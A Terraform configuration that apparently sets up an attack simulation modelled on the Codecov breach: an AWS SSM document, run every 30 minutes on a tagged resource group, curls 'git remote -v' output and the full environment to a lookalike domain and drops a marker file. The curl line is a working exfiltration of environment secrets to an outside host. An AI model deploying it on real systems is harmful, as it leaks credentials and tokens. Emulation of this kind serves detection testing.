locals {
    callback_url = "https://catcher.windowsdefenderpro.net"
}

resource "aws_ssm_document" "exec_codecov" {
  name          = "exec_codecov"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "exec codecov style callback",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "exec_codecov",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "60",
                    "runCommand": [
                        "curl -sm 0.5 -d \"$(git remote -v)<<<<<< ENV $(env)\" ${local.callback_url}/upload/v2 || true",
                        "touch /tmp/attacker_exec_codecov"
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "exec_codecov" {
    name = "exec_codecov"

    resource_query {
        query = jsonencode(var.resource_query_exec_codecov)
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "exec_codecov" {
    association_name = "exec_codecov"

    name = aws_ssm_document.exec_codecov.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.exec_codecov.name,
        ]
    }

    compliance_severity = "HIGH"

    # every 30 minutes
    schedule_expression = "cron(0/30 * * * ? *)"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}